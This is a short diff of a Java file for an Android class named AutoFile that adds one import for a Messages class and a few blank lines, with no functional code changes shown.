@@ -19,6 +19,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
 
+import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
 import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.util.ByteArray;
@@ -52,6 +53,8 @@ public final class AutoFile {
 		file = new File(dir, filename);
 		this.filename = filename;
 	}
+
+
 
 	/**
 	 * Reads the content of the file.
